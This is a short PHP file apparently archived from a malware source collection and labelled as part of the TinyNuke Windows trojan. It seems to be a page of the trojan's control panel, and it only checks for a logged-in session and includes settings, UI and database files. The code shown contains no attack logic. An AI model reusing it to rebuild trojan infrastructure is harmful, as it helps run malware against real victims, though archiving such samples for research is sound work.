/*
  name      TinyNuke
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
<?php
ob_start();
session_start();
if(!isset($_SESSION['auth']))
{
   header('location: login.php');
   exit();
}
require_once('settings_data.php');
require_once('const.php');
require_once('ui.php');
require_once('utils.php');
require_once('db.php');
?>